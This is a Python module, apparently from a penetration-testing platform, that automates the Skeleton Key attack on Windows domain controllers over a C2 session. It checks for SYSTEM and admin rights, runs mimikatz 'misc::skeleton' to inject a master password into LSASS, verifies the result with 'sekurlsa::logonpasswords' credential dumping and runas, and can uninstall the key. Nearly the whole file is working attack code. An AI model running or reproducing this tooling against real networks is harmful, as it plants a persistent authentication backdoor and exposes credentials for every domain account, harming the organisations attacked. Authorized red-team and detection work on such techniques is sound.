"""Skeleton Key attack module for Kunlun penetration testing platform.

Provides:
- Prerequisite detection (SYSTEM permission, OS compatibility)
- Installation and activation via LSASS injection
- Verification of skeleton key functionality
- Uninstall and LSASS restoration
"""

import asyncio
import logging
import secrets
import string
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class OSCompatibility(Enum):
    """Windows Server OS compatibility for Skeleton Key."""
    SUPPORTED = "supported"
    UNSUPPORTED = "unsupported"
    UNKNOWN = "unknown"


class SkeletonKeyStatus(Enum):
    """Skeleton Key installation status."""
    NOT_INSTALLED = "not_installed"
    INSTALLED = "installed"
    INSTALLING = "installing"
    UNINSTALLING = "uninstalling"
    FAILED = "failed"


@dataclass
class PrerequisiteCheck:
    """Prerequisite check result.

    Attributes:
        has_system_permission: Whether current session has SYSTEM permission
        is_dc_local_admin: Whether current user is DC local admin
        os_version: Windows Server version
        os_compatibility: OS compatibility status
        already_installed: Whether skeleton key is already installed
        can_install: Whether all prerequisites are met
        issues: List of issues found
    """
    has_system_permission: bool = False
    is_dc_local_admin: bool = False
    os_version: str = ""
    os_compatibility: OSCompatibility = OSCompatibility.UNKNOWN
    already_installed: bool = False
    can_install: bool = False
    issues: List[str] = field(default_factory=list)


@dataclass
class SkeletonKeyConfig:
    """Configuration for Skeleton Key attack.

    Attributes:
        target_dc: Target domain controller
        custom_password: Custom skeleton key password (empty for random)
        password_length: Random password length
        validity_hours: Validity period in hours (0 for no auto-expiry)
        auto_verify: Auto verify after installation
        stealth_mode: Enable stealth mode
    """
    target_dc: str = ""
    custom_password: str = ""
    password_length: int = 16
    validity_hours: int = 0
    auto_verify: bool = True
    stealth_mode: bool = False


@dataclass
class SkeletonKeyResult:
    """Result of Skeleton Key operation.

    Attributes:
        success: Whether operation succeeded
        status: Current skeleton key status
        password: Skeleton key password
        install_time: Installation timestamp
        expiry_time: Expiry timestamp (0 if no expiry)
        verification_passed: Whether verification passed
        error_message: Error message if failed
        attck_technique: Associated ATT&CK technique ID
        duration_seconds: Operation duration
        target_dc: Target domain controller
    """
    success: bool = False
    status: SkeletonKeyStatus = SkeletonKeyStatus.NOT_INSTALLED
    password: str = ""
    install_time: float = 0.0
    expiry_time: float = 0.0
    verification_passed: bool = False
    error_message: str = ""
    attck_technique: str = "T1556"
    duration_seconds: float = 0.0
    target_dc: str = ""


SUPPORTED_OS_VERSIONS: Dict[str, str] = {
    "6.0": "Windows Server 2008",
    "6.1": "Windows Server 2008 R2",
    "6.2": "Windows Server 2012",
    "6.3": "Windows Server 2012 R2",
    "10.0": "Windows Server 2016/2019/2022",
}


class SkeletonKeyAttack:
    """Skeleton Key attack module.

    Provides prerequisite detection, installation via LSASS injection,
    verification, and uninstall with LSASS restoration.
    """

    def __init__(
        self,
        c2_session: Optional[Any] = None,
        credential_db: Optional[Any] = None,
        event_bus: Optional[Any] = None,
    ) -> None:
        """Initialize Skeleton Key attack module.

        Args:
            c2_session: C2 framework session for command execution.
            credential_db: Credential database for storing results.
            event_bus: Event bus for broadcasting events.
        """
        self.c2_session = c2_session
        self.credential_db = credential_db
        self.event_bus = event_bus
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._installed_keys: Dict[str, SkeletonKeyResult] = {}

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("SkeletonKey Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("SkeletonKey: %s", message)

    async def _execute_command(self, command: str, target: str = "") -> Dict[str, Any]:
        """Execute command via C2 session.

        Args:
            command: Command to execute.
            target: Target host.

        Returns:
            Command execution result.
        """
        if self.c2_session:
            try:
                result = await self.c2_session.execute(command, target=target)
                return {"success": True, "output": result}
            except Exception as e:
                return {"success": False, "error": str(e)}
        return {"success": False, "error": "No C2 session available"}

    async def check_prerequisites(self, target_dc: str = "") -> PrerequisiteCheck:
        """Check prerequisites for Skeleton Key installation.

        Args:
            target_dc: Target domain controller.

        Returns:
            PrerequisiteCheck with all prerequisite status.
        """
        check = PrerequisiteCheck()

        try:
            await self._report_progress("检测前置条件", 5)

            await self._report_log("检测SYSTEM权限...")
            check.has_system_permission = await self._check_system_permission()
            if not check.has_system_permission:
                check.issues.append("当前不具备SYSTEM权限")

            await self._report_log("检测域控本地管理员权限...")
            check.is_dc_local_admin = await self._check_dc_local_admin()
            if not check.is_dc_local_admin:
                check.issues.append("当前不是域控本地管理员")

            await self._report_log("检测操作系统版本...")
            os_info = await self._get_os_version()
            check.os_version = os_info.get("version", "")
            check.os_compatibility = self._check_os_compatibility(check.os_version)
            if check.os_compatibility == OSCompatibility.UNSUPPORTED:
                check.issues.append(f"操作系统 {check.os_version} 不受支持")

            await self._report_log("检测是否已安装Skeleton Key...")
            check.already_installed = await self._check_already_installed()
            if check.already_installed:
                check.issues.append("Skeleton Key已安装，请勿重复安装")

            check.can_install = (
                check.has_system_permission
                and check.is_dc_local_admin
                and check.os_compatibility == OSCompatibility.SUPPORTED
                and not check.already_installed
            )

            progress = 100 if check.can_install else 50
            await self._report_progress("前置条件检测完成", progress)

            if check.can_install:
                await self._report_log("所有前置条件满足，可以安装Skeleton Key")
            else:
                await self._report_log(f"前置条件不满足: {', '.join(check.issues)}")

        except Exception as e:
            check.issues.append(f"检测过程异常: {e}")
            logger.error("Prerequisite check failed: %s", e)

        return check

    async def _check_system_permission(self) -> bool:
        """Check if current session has SYSTEM permission.

        Returns:
            True if running as SYSTEM.
        """
        try:
            result = await self._execute_command("whoami")
            if result.get("success"):
                output = result.get("output", "").lower()
                return "nt authority\\system" in output or "system" in output
        except Exception:
            pass
        return False

    async def _check_dc_local_admin(self) -> bool:
        """Check if current user is DC local admin.

        Returns:
            True if DC local admin.
        """
        try:
            result = await self._execute_command("net localgroup administrators")
            if result.get("success"):
                output = result.get("output", "").lower()
                current_user = await self._get_current_user()
                return current_user.lower() in output
        except Exception:
            pass
        return False

    async def _get_current_user(self) -> str:
        """Get current username.

        Returns:
            Current username.
        """
        try:
            result = await self._execute_command("whoami")
            if result.get("success"):
                return str(result.get("output", "")).strip()
        except Exception:
            pass
        return ""

    async def _get_os_version(self) -> Dict[str, str]:
        """Get Windows Server OS version.

        Returns:
            Dictionary with OS version info.
        """
        try:
            result = await self._execute_command("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"")
            if result.get("success"):
                output = result.get("output", "")
                version = ""
                for line in output.split("\n"):
                    if "Version" in line:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            version = parts[1].strip().split()[0]
                return {"version": version, "raw": output}
        except Exception as e:
            logger.error("Failed to get OS version: %s", e)
        return {"version": "", "raw": ""}

    def _check_os_compatibility(self, os_version: str) -> OSCompatibility:
        """Check OS compatibility for Skeleton Key.

        Args:
            os_version: OS version string.

        Returns:
            OSCompatibility status.
        """
        if not os_version:
            return OSCompatibility.UNKNOWN

        major_version = os_version.split(".")[0]
        if major_version in SUPPORTED_OS_VERSIONS:
            return OSCompatibility.SUPPORTED

        if int(major_version) >= 10:
            return OSCompatibility.SUPPORTED

        return OSCompatibility.UNSUPPORTED

    async def _check_already_installed(self) -> bool:
        """Check if Skeleton Key is already installed.

        Returns:
            True if already installed.
        """
        try:
            result = await self._execute_command(
                "!mimikatz privilege::debug \"!mimikatz misc::skeleton\" exit"
            )
            if result.get("success"):
                output = result.get("output", "").lower()
                return "skeleton" in output and "installed" in output
        except Exception:
            pass
        return False

    def generate_random_password(self, length: int = 16) -> str:
        """Generate random high-strength password.

        Args:
            length: Password length.

        Returns:
            Random password with mixed characters.
        """
        charset = string.ascii_letters + string.digits + "!@#$%^&*"
        password = "".join(secrets.choice(charset) for _ in range(length))
        if not any(c.isupper() for c in password):
            password = password[:1] + secrets.choice(string.ascii_uppercase) + password[1:]
        if not any(c.islower() for c in password):
            password = password[:1] + secrets.choice(string.ascii_lowercase) + password[1:]
        if not any(c.isdigit() for c in password):
            password = password[:1] + secrets.choice(string.digits) + password[1:]
        return password

    async def install_skeleton_key(
        self,
        config: SkeletonKeyConfig,
    ) -> SkeletonKeyResult:
        """Install Skeleton Key via LSASS memory injection.

        Args:
            config: Skeleton Key configuration.

        Returns:
            SkeletonKeyResult with installation status.
        """
        start_time = time.time()
        result = SkeletonKeyResult()

        try:
            await self._report_progress("开始安装Skeleton Key", 5)

            prereq = await self.check_prerequisites(config.target_dc)
            if not prereq.can_install:
                result.error_message = f"前置条件不满足: {', '.join(prereq.issues)}"
                result.status = SkeletonKeyStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            await self._report_progress("生成密码", 15)

            password = config.custom_password if config.custom_password else self.generate_random_password(
                config.password_length
            )
            result.password = password
            await self._report_log(f"万能密码: {password}")

            await self._report_progress("注入LSASS", 30)
            await self._report_log("开始LSASS内存注入...")

            install_cmd = (
                f"!mimikatz privilege::debug "
                f"\"!mimikatz misc::skeleton password:{password}\" "
                f"exit"
            )
            install_result = await self._execute_command(install_cmd, config.target_dc)

            if not install_result.get("success"):
                result.error_message = "LSASS注入失败"
                result.status = SkeletonKeyStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            output = install_result.get("output", "")
            if "skeleton" not in output.lower() and "success" not in output.lower():
                result.error_message = "Skeleton Key安装未确认成功"
                result.status = SkeletonKeyStatus.FAILED
                result.duration_seconds = time.time() - start_time
                return result

            result.status = SkeletonKeyStatus.INSTALLED
            result.install_time = time.time()
            result.success = True

            if config.validity_hours > 0:
                result.expiry_time = result.install_time + (config.validity_hours * 3600)
                await self._report_log(f"有效期: {config.validity_hours} 小时")

            await self._report_progress("安装成功", 80)
            await self._report_log("Skeleton Key安装成功!")

            if config.auto_verify:
                await self._report_progress("验证Skeleton Key", 90)
                verified = await self.verify_skeleton_key(config.target_dc, password)
                result.verification_passed = verified
                if verified:
                    await self._report_log("验证成功: 万能密码可用")
                else:
                    await self._report_log("警告: 验证失败，万能密码可能不可用")

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

            self._installed_keys[config.target_dc] = result

            await self._broadcast_event(result, config)

        except Exception as e:
            result.error_message = str(e)
            result.status = SkeletonKeyStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"Skeleton Key安装失败: {e}")
            logger.error("Skeleton Key installation failed: %s", e)

        return result

    async def verify_skeleton_key(
        self,
        target_dc: str,
        password: str,
        test_user: str = "administrator",
    ) -> bool:
        """Verify Skeleton Key by testing login.

        Args:
            target_dc: Target domain controller.
            password: Skeleton key password.
            test_user: Test user account.

        Returns:
            True if verification passed.
        """
        try:
            await self._report_log(f"验证Skeleton Key: 使用 {test_user} 测试登录...")

            verify_cmd = (
                f"Invoke-Mimikatz -Command '\"sekurlsa::logonpasswords\"' "
                f"-ComputerName {target_dc}"
            )
            result = await self._execute_command(verify_cmd)

            if result.get("success"):
                output = result.get("output", "")
                if "Password" in output or "NTLM" in output:
                    return True

            runas_cmd = (
                f"runas /user:{test_user}@{target_dc} "
                f"\"cmd /c echo test\""
            )
            runas_result = await self._execute_command(runas_cmd)
            return bool(runas_result.get("success", False))

        except Exception as e:
            logger.error("Verification failed: %s", e)
            return False

    async def uninstall_skeleton_key(
        self,
        target_dc: str = "",
    ) -> bool:
        """Uninstall Skeleton Key and restore LSASS.

        Args:
            target_dc: Target domain controller.

        Returns:
            True if uninstall successful.
        """
        try:
            await self._report_log(f"开始卸载 {target_dc} 的Skeleton Key...")

            result = await self._execute_command(
                "!mimikatz privilege::debug "
                "\"!mimikatz misc::skeleton /uninstall\" "
                "exit",
                target_dc,
            )

            if result.get("success"):
                await self._report_log("Skeleton Key卸载成功")
                self._installed_keys.pop(target_dc, None)

                await self._report_log("验证正常密码登录是否恢复...")
                restored = await self._verify_lsass_restored(target_dc)
                if restored:
                    await self._report_log("LSASS状态已恢复")
                else:
                    await self._report_log("警告: LSASS状态验证失败")

                return True
            else:
                await self._report_log("卸载失败")
                return False

        except Exception as e:
            logger.error("Uninstall failed: %s", e)
            await self._report_log(f"卸载异常: {e}")
            return False

    async def _verify_lsass_restored(self, target_dc: str) -> bool:
        """Verify LSASS has been restored to normal state.

        Args:
            target_dc: Target domain controller.

        Returns:
            True if LSASS is restored.
        """
        try:
            result = await self._execute_command(
                "tasklist /fi \"imagename eq lsass.exe\"",
                target_dc,
            )
            return result.get("success", False) and "lsass.exe" in result.get("output", "")
        except Exception:
            return False

    async def auto_uninstall_expired(self) -> List[str]:
        """Auto uninstall expired skeleton keys.

        Returns:
            List of uninstalled target DCs.
        """
        uninstalled: List[str] = []
        current_time = time.time()

        for target_dc, key_result in list(self._installed_keys.items()):
            if key_result.expiry_time > 0 and current_time > key_result.expiry_time:
                await self._report_log(f"Skeleton Key已过期，自动卸载: {target_dc}")
                success = await self.uninstall_skeleton_key(target_dc)
                if success:
                    uninstalled.append(target_dc)

        return uninstalled

    async def _broadcast_event(
        self,
        result: SkeletonKeyResult,
        config: SkeletonKeyConfig,
    ) -> None:
        """Broadcast skeleton key event.

        Args:
            result: Installation result.
            config: Configuration used.
        """
        if not self.event_bus:
            return

        try:
            event_data = {
                "event_type": "skeleton_key_attack",
                "success": result.success,
                "target_dc": config.target_dc,
                "status": result.status.value,
                "verification_passed": result.verification_passed,
                "attck_technique": result.attck_technique,
                "timestamp": time.time(),
                "expiry_time": result.expiry_time,
            }
            await self.event_bus.publish("domain_attack", event_data)
        except Exception as e:
            logger.error("Failed to broadcast skeleton key event: %s", e)
